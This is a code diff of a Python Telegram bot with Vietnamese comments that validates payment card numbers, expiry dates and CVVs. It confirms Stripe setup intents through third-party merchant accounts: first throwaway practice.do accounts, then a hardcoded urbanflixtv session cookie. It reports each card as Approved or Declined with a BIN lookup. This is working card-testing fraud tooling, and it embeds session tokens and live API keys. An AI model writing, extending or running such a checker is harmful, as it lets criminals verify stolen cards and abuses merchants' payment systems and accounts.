@@ -1,4 +1,4 @@
-import requests, re, time, asyncio, random, string
+import requests, re, time, asyncio
 from telegram import Update, InputFile
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from bs4 import BeautifulSoup
@@ -9,130 +9,60 @@ ADMIN_ID = 5127429005
 ALLOWED_USERS = {ADMIN_ID}
 USER_RANKS = {ADMIN_ID: "admin"}
 
+COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F137.0.0.0+Safari%2F537.36; started_at=2025-07-04+13%3A18%3A34+%2B0400; initialized=true; pixel_session=42fa4f62-24ee-4290-b944-29a1c4b6a040; __stripe_mid=c4954d5a-d300-446d-8144-a7c65563cbac3f9142; __stripe_sid=6147f14c-a06f-420c-a782-594d676d8a2a332b9d; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3lOakV6T1RreE1GMHNJaVF5WVNReE1DUnNNVXhGUm01SFIxRktjVTFKVldRelpIaFViWEoxSWl3aU1UYzFNVFl5TURnNU5pNHhPVGd3TmpZM0lsMD0iLCJleHAiOiIyMDI1LTA3LTE4VDA5OjIxOjM2LjE5OFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--8527b8dbcf83519531f0efb3138277bed6dca942; user_referrer=https%3A%2F%2Furbanflixtv.com%2Faccount%2Fpurchases; _uscreen2_session=Wuaaj7drKz9cEXYzN8JSMk0CyIVGH%2F5LobLcSzp2j5KpnpWRbQyfWaB9TjyiAvv625X0S9O%2BqY5gR8apPLMoTR1VJ5DCsKr6wQVREGRZDluhZDYdduMptP%2FI37guWMtI%2BfXKIAOieSuwort4XeQaZCJHecqesYujxG2vCkT62oyYFpVBKK9QTcn37B7pH5mVOCAjPzKQeZhz8zg7m9uM6SkuFbs3qTu1oVpqTDiwNj896tqiY4Do2N2PgLH9zl%2FAhABhKFpkhup3XV850HgPONukbRcge%2BqIB9xpwUPL1CfVofj2QQaQuQwjBLc55Fo2LA4ah9CUh17aJ4vAZ0tP%2B4OHlBFyoeY%2BFdIxtn8VihCWwizY%2F%2B57IB3eahWEkGGnjhcNDws382eKoiWpjIeT60ya0SjDL2SFDTw60CBs%2BiQGjaJ0WtmdiyU%3D--%2FMF2m6h5yj3XpgiU--7WSv5xuZvzz5%2FzO0g7tDLg%3D%3D"
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "cookie": COOKIES
+}
+
 # ========== HÀM XỬ LÝ THẺ ========== #
 async def process_card(cc, mes, ano, cvv, user_id=None):
-    def random_email():
-        prefix = ''.join(random.choices(string.ascii_lowercase, k=18))
-        return f"{prefix}62@gmail.com"
-
+    bin_code = cc[:6]
     start_time = time.time()
     try:
-        email = random_email()
-        payload1 = {
-            "email": email,
-            "isCoach": True,
-            "password": "Minhnhat##123",
-            "firstName": "Nhat",
-            "lastName": "Minh"
-        }
-        headers_json = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
-            "Pragma": "no-cache",
-            "Accept": "*/*"
-        }
+        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
+        soup = BeautifulSoup(r1.text, "html.parser")
+        token_tag = soup.find("meta", {"name": "csrf-token"})
+        if not token_tag:
+            return "❌ Không lấy được CSRF token."
 
-        # Tạo user
-        r1 = requests.post("https://app.practice.do/api/v1/users/create", json=payload1, headers=headers_json)
-        if "Email already in use" in r1.text:
-            return "❌ Email đã được sử dụng."
+        # Retry tối đa 5 lần nếu lỗi setup_intent
+        setid = ""
+        for attempt in range(5):
+            r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
+            if r2.status_code == 200:
+                try:
+                    setid = r2.json().get("setup_intent", "")
+                    if setid:
+                        break
+                except Exception:
+                    pass
+            time.sleep(1)
+        if not setid:
+            return "❌ Lỗi lấy setup_intent (sau 5 lần thử)"
 
-        # Lấy token đăng nhập
-        r2 = requests.post(
-            "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
-            json={
-                "returnSecureToken": True,
-                "email": email,
-                "password": "Minhnhat##123",
-                "clientType": "CLIENT_TYPE_WEB"
-            },
-            headers=headers_json
-        )
-        tk = r2.json().get("idToken")
-        if not tk:
-            return "❌ Không đăng nhập được (không lấy được token)."
+        setin = setid.split("_secret_")[0]
 
-        headers_token = {
-            "host": "app.practice.do",
-            "accept": "application/json, text/plain, */*",
-            "content-length": "0",
-            "origin": "https://app.practice.do",
-            "pragma": "no-cache",
-            "user-agent": headers_json["User-Agent"],
-            "cookie": f"firebase_token={tk}"
-        }
-        r3 = requests.post(
-            "https://app.practice.do/api/v1/users/zy9ODRErt6VR2i98vmtMUPNkL533/stripe/setup-intent",
-            headers=headers_token
-        )
-        src = r3.text
-        d = r3.json().get("clientSecret", "")
-        n = src.split("\"clientSecret\":\"")[1].split("_secret_")[0]
-
-        # Gửi lên Stripe đúng chuẩn urbanflixtv logic
-        form_data = {
-            "return_url": f"https://app.practice.do/start-trial?step=2&email={email}&planInformation=%257B%2522name%2522%253A%2522Basic%2522%252C%2522priceId%2522%253A%2522price_1O9UHlDXXMkswpxpZ6L912U1%2522%252C%2522tier%2522%253A%2522basic%2522%252C%2522frequency%2522%253A%2522month%2522%252C%2522amount%2522%253A5%252C%2522currency%2522%253A%2522usd%2522%257D",
+        payload = {
+            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
             "payment_method_data[type]": "card",
             "payment_method_data[card][number]": cc,
             "payment_method_data[card][cvc]": cvv,
             "payment_method_data[card][exp_year]": ano,
             "payment_method_data[card][exp_month]": mes,
-            "payment_method_data[allow_redisplay]": "unspecified",
             "payment_method_data[billing_details][address][country]": "VN",
-            "payment_method_data[pasted_fields]": "number",
-            "payment_method_data[payment_user_agent]": "stripe.js/2b21fdf9ae; stripe-js-v3/2b21fdf9ae; payment-element",
-            "payment_method_data[referrer]": "https://app.practice.do",
-            "payment_method_data[time_on_page]": "15258",
-            "payment_method_data[client_attribution_metadata][client_session_id]": "7308a4fd-b6e8-4919-8480-f8c9baf770e0",
-            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
-            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
-            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
-            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
-            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
-            "payment_method_data[guid]": "f8f17c37-ca8b-4c7c-bdf0-6b8cd5bd2ab25eb368",
-            "payment_method_data[muid]": "c2de6ae0-e50e-4547-bb09-debe6a55ec13709f78",
-            "payment_method_data[sid]": "9d49c487-2b7a-47d2-9b3b-264f73b4073d616e77",
-            "expected_payment_method_type": "card",
             "use_stripe_sdk": "true",
-            "key": "pk_live_8vuRcdG8hx5kBi7MTtoqIeCc00alpMFwtE",
-            "client_secret": d
+            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
+            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
+            "client_secret": setid
         }
-        headers_form = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": headers_json["User-Agent"],
-            "Pragma": "no-cache",
-            "Accept": "*/*"
-        }
-        r4 = requests.post(f"https://api.stripe.com/v1/setup_intents/{n}/confirm", data=form_data, headers=headers_form)
-        j4 = r4.json()
-        status = j4.get("status", "UNKNOWN")
-        decline = j4.get("decline_code") or j4.get("error", {}).get("decline_code") or "NONE"
-        status_lower = status.lower() if status else ""
 
-        # Logic checker urbanflixtv
-        if status_lower == "succeeded":
-            status_label = "✅ Approved"
-        elif any(key in status_lower for key in [
-            "requires_action", "requires_source_action",
-            "processing", "requires_confirmation",
-            "requires_capture", "requires_customer_action"
-        ]):
-            status_label = "⚠️ Requires 3DS / Action"
-        elif decline == "insufficient_funds":
-            status_label = "⚠️ Insufficient Funds"
-        elif decline in ["incorrect_cvc", "invalid_cvc"]:
-            status_label = "⚠️ Invalid CVC"
-        elif (decline in [
-            "transaction_not_allowed", "generic_decline", "fraudulent", "live_mode_test_card",
-            "incorrect_number", "card_not_supported", "pickup_card", "processing_error",
-            "do_not_honor", "stolen_card", "invalid_account"
-        ] or status_lower in ["requires_payment_method", "canceled"]):
-            status_label = "❌ Declined"
-        else:
-            status_label = "❓ Unknown Status"
+        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
+        j3 = r3.json()
+        status = j3.get("status", "UNKNOWN")
+        decline = j3.get("error", {}).get("decline_code", "NONE")
 
-        # Check BIN
-        bin_code = cc[:6]
         bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}")
         bin_json = bin_res.json()
         card = bin_json.get("scheme", "N/A")
@@ -146,10 +76,10 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
 <b>✅ CHECK RESULT</b>
 
 <b>CC:</b> {cc}|{mes}|{ano}|{cvv}
-<b>Status:</b> {status_label}
+<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
 <b>Decline Code:</b> {decline}
 
-<b>Gateway:</b> Practice.do → Stripe
+<b>Gateway:</b> Stripe
 <b>Card:</b> {card.upper()}
 <b>Type:</b> {type_.capitalize()}
 <b>Brand:</b> {brand}
